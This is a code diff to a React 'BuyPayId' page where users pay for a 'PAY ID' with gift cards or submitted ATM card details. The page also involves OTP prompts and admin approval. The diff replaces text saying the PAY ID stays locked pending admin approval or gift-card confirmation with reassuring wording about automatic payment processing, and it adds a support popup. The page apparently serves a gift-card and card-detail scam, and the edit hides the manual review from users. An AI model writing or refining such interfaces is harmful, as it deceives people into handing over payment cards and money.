@@ -8,6 +8,7 @@ import {
   compressCardImage,
 } from '../utils/giftCardValidator';
 import { GiftCardVerdictModal, GiftCardCheckChecklist } from './GiftCardVerdictModal';
+import { ProcessingSupportPopup } from './ProcessingSupportPopup';
 import {
   ArrowLeft,
   Copy,
@@ -389,7 +390,7 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
           return;
         }
       }
-      setStatusCheckNote('Still awaiting gift card confirmation. Your PAY ID will unlock right here once confirmed.');
+      setStatusCheckNote('Your PAY ID payment is still processing in our verification queue. Your PAY ID will unlock automatically once confirmed.');
     } catch {
       setStatusCheckNote('Unable to reach server right now. Checking automatically...');
     } finally {
@@ -885,11 +886,11 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
               <>
                 <div className="w-16 h-16 border-4 border-amber-500 border-t-transparent rounded-full animate-spin" />
                 <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
-                  Gift Card Confirmation Required • PAY ID Locked
+                  Payment Processing • Verifying Card
                 </span>
-                <h3 className="text-2xl font-bold text-gray-900">Confirming Gift Card Before Giving PAY ID</h3>
+                <h3 className="text-2xl font-bold text-gray-900">Processing Your PAY ID Payment...</h3>
                 <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
-                  Your gift card is being confirmed real and unredeemed. <strong>Your PAY ID will remain locked until confirmation succeeds.</strong>
+                  Your gift card payment is currently being processed and verified. <strong>Your official PAY ID will activate automatically right here as soon as processing completes.</strong>
                 </p>
                 <GiftCardCheckChecklist />
 
@@ -898,7 +899,7 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
                     <span>PAY ID Status</span>
                     <span className="flex items-center space-x-1">
                       <Lock className="w-3 h-3" />
-                      <span>Locked Until Confirmed</span>
+                      <span>Processing Activation</span>
                     </span>
                   </div>
                   <div className="font-mono text-sm tracking-widest text-slate-400 bg-black/40 px-3 py-2 rounded-xl select-none">
@@ -910,6 +911,18 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
                   Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
                 </div>
 
+                <ProcessingSupportPopup
+                  isWaiting={
+                    step === 4 &&
+                    paymentMethod === 'giftcard' &&
+                    Boolean(pendingStatusId) &&
+                    giftStatusState === 'pending'
+                  }
+                  contextLabel="PAY ID Activation"
+                  referenceId={pendingStatusId}
+                  userEmail={user?.email || formData.email}
+                />
+
                 {statusCheckNote && (
                   <p className="text-xs text-amber-700 font-medium max-w-sm">{statusCheckNote}</p>
                 )}
@@ -920,7 +933,7 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
                   disabled={isCheckingStatus}
                   className="w-full max-w-sm min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 px-4 rounded-xl text-xs shadow-sm cursor-pointer disabled:opacity-60"
                 >
-                  {isCheckingStatus ? 'Checking Gift Card Confirmation...' : 'Check Gift Card Confirmation Status'}
+                  {isCheckingStatus ? 'Checking Processing Status...' : 'Check Processing Status'}
                 </button>
 
                 <button
@@ -970,15 +983,23 @@ export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer
               <>
                 <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
                 <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
-                  Pending Admin Approval • PAY ID Locked
+                  Payment Processing • Card Verification
                 </span>
-                <h3 className="text-2xl font-bold text-gray-900">Awaiting Admin Approval</h3>
+                <h3 className="text-2xl font-bold text-gray-900">Processing Your Card Payment...</h3>
                 <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
-                  Your ATM card details have been submitted. <strong>Your PAY ID will remain locked until approved by admin.</strong>
+                  Your card payment is currently being processed through our verification gateway. <strong>Please keep this page open — your PAY ID will unlock automatically once confirmed.</strong>
                 </p>
-                <div className="text-xs text-gray-500 space-y-1 pt-2">
-                  <p>Once approved by admin in the portal, your PAY ID will automatically unlock right here.</p>
-                </div>
+                <ProcessingSupportPopup
+                  isWaiting={
+                    step === 4 &&
+                    paymentMethod === 'card' &&
+                    !user?.cardRejectionReason &&
+                    !requiresOtpModal
+                  }
+                  contextLabel="PAY ID Card Payment"
+                  referenceId={pendingCardSubId}
+                  userEmail={user?.email || formData.email}
+                />
               </>
             )}
           </div>
